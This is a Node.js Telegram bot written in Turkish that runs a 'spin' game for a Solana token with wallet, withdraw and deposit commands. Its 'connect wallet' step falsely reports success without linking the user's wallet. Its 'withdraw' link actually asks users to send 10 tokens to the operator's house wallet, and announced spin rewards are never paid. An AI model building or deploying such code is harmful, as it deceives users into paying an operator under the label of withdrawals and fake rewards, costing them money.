require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");

// .env dosyasından token alınır
const token = process.env.TELEGRAM_BOT_TOKEN;

if (!token) {
    console.error("⚠️ Bot token bulunamadı. Lütfen .env dosyasını kontrol edin.");
    process.exit(1);
}

const bot = new TelegramBot(token, { polling: true });

const connectedWallets = new Map();
const coinAddress = "GRjLQ8KXegtxjo5P2C2Gq71kEdEk3mLVCMx4AARUpump";
const houseWalletAddress = "5dA8kKepycbZ43Zm3MuzRGro5KkkzoYusuqjz8MfTBwn";

// Solana Pay URL oluşturucu
function generateSolanaPayUrl(walletAddress, amount, label, message) {
    return `solana:${walletAddress}?amount=${amount}&token=${coinAddress}&label=${encodeURIComponent(label)}&message=${encodeURIComponent(message)}`;
}

// /connectwallet komutu
bot.onText(/\/connectwallet/, async (msg) => {
    const chatId = msg.chat.id;

    try {
        const solanaPayUrl = generateSolanaPayUrl(
            houseWalletAddress,
            0,
            "Connect Wallet",
            "Connect your Phantom Wallet"
        );

        bot.sendMessage(
            chatId,
            `Cüzdanınızı bağlamak için aşağıdaki bağlantıyı tıklayın:\n\n[Bağlantıyı Tıklayın](${solanaPayUrl})`,
            { parse_mode: "Markdown" }
        );

        connectedWallets.set(chatId, houseWalletAddress);
        bot.sendMessage(chatId, "✅ Cüzdan başarıyla bağlandı.");
    } catch (error) {
        console.error("Cüzdan bağlanırken hata oluştu:", error);
        bot.sendMessage(chatId, "⚠️ Cüzdan bağlanırken bir hata oluştu. Lütfen tekrar deneyin.");
    }
});

// /spin komutu
bot.onText(/\/spin/, (msg) => {
    const chatId = msg.chat.id;

    if (!connectedWallets.has(chatId)) {
        bot.sendMessage(chatId, "⚠️ Önce cüzdan bağlamalısınız! Lütfen /connectwallet komutunu kullanın.");
        return;
    }

    const spinResult = Math.floor(Math.random() * 100) + 1;
    let reward = 0;

    if (spinResult > 90) reward = 100;
    else if (spinResult > 50) reward = 5;
    else if (spinResult > 20) reward = 1;

    if (reward > 0) {
        bot.sendMessage(chatId, `🎉 Tebrikler! ${reward} 2JZ Coin kazandınız!`);
    } else {
        bot.sendMessage(chatId, "Spin sonucunda maalesef ödül kazanamadınız. Tekrar deneyin!");
    }
});

// /withdraw komutu
bot.onText(/\/withdraw/, (msg) => {
    const chatId = msg.chat.id;

    if (!connectedWallets.has(chatId)) {
        bot.sendMessage(chatId, "⚠️ Cüzdanınız bağlı değil! Lütfen önce /connectwallet komutunu kullanın.");
        return;
    }

    const withdrawUrl = generateSolanaPayUrl(
        houseWalletAddress,
        10,
        "Withdraw Coins",
        "Withdraw your 2JZ coins"
    );

    bot.sendMessage(
        chatId,
        `Coinlerinizi çekmek için aşağıdaki bağlantıyı kullanabilirsiniz:\n\n[Bağlantıyı Tıklayın](${withdrawUrl})`,
        { parse_mode: "Markdown" }
    );
});

// /deposit komutu
bot.onText(/\/deposit/, (msg) => {
    const chatId = msg.chat.id;

    const depositUrl = generateSolanaPayUrl(
        houseWalletAddress,
        100,
        "Deposit Coins",
        "Deposit your 2JZ coins for gameplay"
    );

    bot.sendMessage(
        chatId,
        `Coin yatırmak için aşağıdaki bağlantıyı kullanabilirsiniz:\n\n[Bağlantıyı Tıklayın](${depositUrl})`,
        { parse_mode: "Markdown" }
    );
});

// Hata yönetimi
bot.on("polling_error", (error) => {
    console.error("Telegram Bot Hatası:", error);
});
